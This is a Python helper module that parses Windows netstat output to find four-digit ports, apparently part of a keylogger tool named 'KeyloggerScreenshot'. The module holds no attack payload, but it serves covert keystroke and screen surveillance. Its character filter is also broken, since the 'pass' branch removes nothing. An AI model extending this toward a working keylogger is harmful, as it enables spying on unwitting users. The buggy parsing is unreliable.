import subprocess
import sys

class Ports:

    @staticmethod
    def get_working_ports():
        if sys.platform != "linux":
            # Only here for windows
            cmd = subprocess.check_output(["netstat", "-ano"])
            # This command shows all the ports on your pc
            all = cmd.split()

            working_ports = []
            zahlen = [str(zahl) for zahl in range(0, 11)]
            # makes a range of numbers from 0 to 10

            for each in all:
                str_each = str(each)
                if ":" in str_each:
                    switch = str_each[::-1]
                    # for e.g "0.0.0.0:1352" will be turned around to 5312:0.0.0.0 so it's easier to parse trough
                    this_port = ""
                    for port in switch:
                        if port not in zahlen: pass
                        # This gets all unnecessary charecters away
                        if port == ":": break
                        # Check if number are there if ":" is there it will stop
                        this_port += port
                        # If all this conditions aren't true it will form to a number

                    another_switch = this_port[::-1]
                    # from our example "this_port" will contain "5312" to get the original port we are just flipping the port again
                    if "'" in another_switch: another_switch = another_switch.replace("'", "")

                    if len(another_switch) == 4:
                        # Only ports with the length of 4 digits will go through because we only use 4 digits for the ports in KeyloggerScreenshot
                        working_ports.append(another_switch)
            return working_ports
            # If everything is good it will return all other ports
        return None
        # This is only for os other than windwos
